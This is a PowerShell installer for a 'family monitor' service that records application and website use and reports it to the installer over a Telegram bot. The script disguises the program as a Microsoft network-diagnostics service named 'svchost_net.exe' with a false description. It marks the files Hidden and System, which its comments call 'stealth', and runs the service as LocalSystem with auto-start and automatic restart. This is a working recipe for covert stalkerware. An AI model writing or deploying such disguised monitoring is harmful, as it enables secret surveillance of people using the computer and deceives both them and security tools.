# ======================================================================
# WINDOWS FAMILY MONITOR - INSTALLATION SCRIPT
# ======================================================================
# This script installs the Windows Family Monitor service
# Run as Administrator
# ======================================================================

param(
    [Parameter(Mandatory=$false)]
    [string]$TelegramBotToken = "",
    
    [Parameter(Mandatory=$false)]
    [string]$TelegramUserId = "",
    
    [Parameter(Mandatory=$false)]
    [string]$ReportTime = "19:00"
)

# Check for Administrator privileges
if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Write-Error "This script must be run as Administrator!"
    exit 1
}

Write-Host "======================================================================" -ForegroundColor Cyan
Write-Host "  Windows Family Monitor - Installation" -ForegroundColor Cyan
Write-Host "======================================================================" -ForegroundColor Cyan
Write-Host ""

# Configuration
$serviceName = "WindowsNetworkHealthService"
$displayName = "Windows Network Health Service"
$description = "Monitors network health and application usage for system optimization"
$installDir = "$env:ProgramData\Microsoft\NetworkDiagnostics"
$exeName = "svchost_net.exe"

# Get current directory
$sourceDir = $PSScriptRoot

# Collect required information if not provided
if ([string]::IsNullOrEmpty($TelegramBotToken)) {
    Write-Host "Step 1: Telegram Bot Configuration" -ForegroundColor Yellow
    Write-Host "To get a bot token:" -ForegroundColor Gray
    Write-Host "  1. Open Telegram and search for @BotFather" -ForegroundColor Gray
    Write-Host "  2. Send /newbot and follow instructions" -ForegroundColor Gray
    Write-Host "  3. Copy the token provided" -ForegroundColor Gray
    Write-Host ""
    $TelegramBotToken = Read-Host "Enter your Telegram Bot Token"
}

if ([string]::IsNullOrEmpty($TelegramUserId)) {
    Write-Host ""
    Write-Host "Step 2: Your Telegram User ID" -ForegroundColor Yellow
    Write-Host "To get your user ID:" -ForegroundColor Gray
    Write-Host "  1. Open Telegram and search for @userinfobot" -ForegroundColor Gray
    Write-Host "  2. Start the bot - it will show your ID" -ForegroundColor Gray
    Write-Host ""
    $TelegramUserId = Read-Host "Enter your Telegram User ID"
}

Write-Host ""
Write-Host "Step 3: Installation" -ForegroundColor Yellow

# Stop service if it exists
try {
    $existingService = Get-Service -Name $serviceName -ErrorAction SilentlyContinue
    if ($existingService) {
        Write-Host "Stopping existing service..." -ForegroundColor Gray
        Stop-Service -Name $serviceName -Force
        Start-Sleep -Seconds 2
        
        Write-Host "Removing existing service..." -ForegroundColor Gray
        sc.exe delete $serviceName | Out-Null
        Start-Sleep -Seconds 2
    }
} catch {
    # Service doesn't exist, continue
}

# Create installation directory
Write-Host "Creating installation directory..." -ForegroundColor Gray
if (-not (Test-Path $installDir)) {
    New-Item -Path $installDir -ItemType Directory -Force | Out-Null
}

# Create subdirectories
$logsDir = Join-Path $installDir "Logs"
if (-not (Test-Path $logsDir)) {
    New-Item -Path $logsDir -ItemType Directory -Force | Out-Null
}

# Find the published executable
$sourceExe = Join-Path $sourceDir "sample1.exe"
if (-not (Test-Path $sourceExe)) {
    # Try to find in bin/Release/publish
    $sourceExe = Get-ChildItem -Path $sourceDir -Recurse -Filter "sample1.exe" | Select-Object -First 1 -ExpandProperty FullName
}

if (-not (Test-Path $sourceExe)) {
    Write-Error "Could not find sample1.exe. Please build the project first with:"
    Write-Host "  dotnet publish -c Release -r win-x64 --self-contained" -ForegroundColor Yellow
    exit 1
}

# Copy executable with stealth name
Write-Host "Installing service executable..." -ForegroundColor Gray
$destExe = Join-Path $installDir $exeName
Copy-Item -Path $sourceExe -Destination $destExe -Force

# Update appsettings.json
Write-Host "Configuring service..." -ForegroundColor Gray
$configPath = Join-Path $installDir "appsettings.json"
$configSource = Join-Path $sourceDir "appsettings.json"

if (Test-Path $configSource) {
    $config = Get-Content $configSource -Raw | ConvertFrom-Json
} else {
    # Create default config
    $config = @{
        Logging = @{
            LogLevel = @{
                Default = "Information"
                Microsoft = "Warning"
            }
        }
        Telegram = @{
            BotToken = ""
            AuthorizedUsers = @()
            ReportTime = "19:00"
            MaxFailedAttempts = 5
        }
        Monitoring = @{
            ProcessCheckIntervalMs = 1000
            NetworkCheckIntervalMs = 5000
            DataSaveIntervalMs = 300000
            MaxCpuPercent = 2.0
            MaxMemoryMB = 50
        }
        Database = @{
            FilePath = "activity.db"
            DataRetentionDays = 7
        }
        Security = @{
            EncryptionKey = ""
            EnableStealth = $true
        }
        SystemProcesses = @("explorer", "svchost", "dllhost", "conhost", "dwm", "taskhostw", "runtimebroker")
        SystemDomains = @("microsoft.com", "windowsupdate.com", "ntp.org", "akamai.net", "google.com", "gstatic.com")
    }
}

# Update configuration
$config.Telegram.BotToken = $TelegramBotToken
$config.Telegram.AuthorizedUsers = @([long]$TelegramUserId)
$config.Telegram.ReportTime = $ReportTime

# Generate encryption key if not set
if ([string]::IsNullOrEmpty($config.Security.EncryptionKey) -or $config.Security.EncryptionKey -eq "GENERATE_ON_INSTALL") {
    $config.Security.EncryptionKey = [guid]::NewGuid().ToString("N") + [guid]::NewGuid().ToString("N")
}

# Save configuration
$config | ConvertTo-Json -Depth 10 | Set-Content $configPath -Force

# Set file attributes to Hidden + System
Write-Host "Applying stealth attributes..." -ForegroundColor Gray
Set-ItemProperty -Path $destExe -Name Attributes -Value ([System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System)
Set-ItemProperty -Path $installDir -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)

# Create Windows Service
Write-Host "Creating Windows Service..." -ForegroundColor Gray
$binPath = "`"$destExe`""
sc.exe create $serviceName binPath= $binPath start= auto DisplayName= $displayName | Out-Null

if ($LASTEXITCODE -ne 0) {
    Write-Error "Failed to create service"
    exit 1
}

# Set service description
sc.exe description $serviceName $description | Out-Null

# Configure service recovery options (restart on failure)
sc.exe failure $serviceName reset= 86400 actions= restart/5000/restart/10000/restart/30000 | Out-Null

# Set service to run as LocalSystem
sc.exe config $serviceName obj= LocalSystem | Out-Null

# Start the service
Write-Host "Starting service..." -ForegroundColor Gray
Start-Service -Name $serviceName

# Wait a moment and check status
Start-Sleep -Seconds 3
$service = Get-Service -Name $serviceName

if ($service.Status -eq "Running") {
    Write-Host ""
    Write-Host "======================================================================" -ForegroundColor Green
    Write-Host "  Installation Completed Successfully!" -ForegroundColor Green
    Write-Host "======================================================================" -ForegroundColor Green
    Write-Host ""
    Write-Host "Service Information:" -ForegroundColor Cyan
    Write-Host "  Name: $serviceName" -ForegroundColor Gray
    Write-Host "  Display Name: $displayName" -ForegroundColor Gray
    Write-Host "  Status: Running" -ForegroundColor Green
    Write-Host "  Install Location: $installDir" -ForegroundColor Gray
    Write-Host ""
    Write-Host "Telegram Bot:" -ForegroundColor Cyan
    Write-Host "  Open Telegram and send /start to your bot to begin" -ForegroundColor Gray
    Write-Host "  Use /apps to see application usage" -ForegroundColor Gray
    Write-Host "  Use /network to see website usage" -ForegroundColor Gray
    Write-Host "  Daily reports will be sent at $ReportTime" -ForegroundColor Gray
    Write-Host ""
    Write-Host "Logs Location:" -ForegroundColor Cyan
    Write-Host "  $logsDir" -ForegroundColor Gray
    Write-Host ""
} else {
    Write-Host ""
    Write-Host "======================================================================" -ForegroundColor Red
    Write-Host "  Installation Failed!" -ForegroundColor Red
    Write-Host "======================================================================" -ForegroundColor Red
    Write-Host ""
    Write-Host "Service Status: $($service.Status)" -ForegroundColor Red
    Write-Host "Please check the logs at: $logsDir" -ForegroundColor Yellow
    Write-Host ""
}

Write-Host "Press any key to exit..."
$null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
